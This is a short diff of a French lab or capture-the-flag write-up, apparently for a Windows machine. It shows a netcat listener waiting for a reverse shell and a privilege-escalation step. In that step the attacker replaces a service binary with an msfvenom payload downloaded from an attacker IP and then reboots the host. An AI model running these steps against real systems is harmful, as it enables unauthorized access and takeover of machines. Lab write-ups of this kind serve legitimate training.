@@ -63,11 +63,13 @@ Il n'y a plus qu'à exploiter la backdoor. Mais attention à bien aller la cherc
     rlwrap nc -nvlp 443
     type C:\Users\Jerren\Desktop\local.txt
 
-Pour l'élévation de privilèges il suffit de reprendre l'exploit trouvé pendant la phase de reconnaissance, en l'adaptant un peu si on le souhaite :
+### Élévation de privilèges 
+
+Il suffit de reprendre l'exploit trouvé pendant la phase de reconnaissance, en l'adaptant un peu si on le souhaite :
 
     cd C:\bd
     ren bd.exe bd.exe.old
-    iwr http://192.168.45.226/msfvenom.exe -Outfile C:\bd\bd.exe
+    iwr -Uri http://192.168.45.226/msfvenom.exe -Outfile C:\bd\bd.exe
     shutdown /r
     ...
     rlwrap nc -nvlp 9999
